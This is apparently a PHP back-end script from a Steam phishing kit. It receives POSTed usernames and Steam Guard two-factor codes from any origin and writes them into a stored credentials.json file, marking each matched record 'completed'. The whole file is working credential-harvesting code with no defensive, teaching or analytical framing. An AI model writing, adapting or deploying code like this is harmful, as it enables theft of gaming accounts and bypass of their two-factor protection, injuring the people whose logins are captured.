
<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit();
}

$dataFile = __DIR__ . '/credentials.json';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the raw POST data
    $rawData = file_get_contents('php://input');
    $data = json_decode($rawData, true);
    
    if ($data && isset($data['username']) && isset($data['code'])) {
        // Read existing data
        $existingData = json_decode(file_get_contents($dataFile), true);
        $updated = false;
        
        // Find and update the matching record
        foreach ($existingData as &$credential) {
            if ($credential['username'] === $data['username']) {
                $credential['steamguard'] = $data['code'];
                $credential['status'] = 'completed';
                $updated = true;
                break;
            }
        }
        
        if ($updated) {
            // Save back to file
            file_put_contents($dataFile, json_encode($existingData, JSON_PRETTY_PRINT));
            echo json_encode(['success' => true]);
        } else {
            http_response_code(404);
            echo json_encode(['success' => false, 'error' => 'User not found']);
        }
    } else {
        http_response_code(400);
        echo json_encode(['success' => false, 'error' => 'Invalid data format']);
    }
}
?>
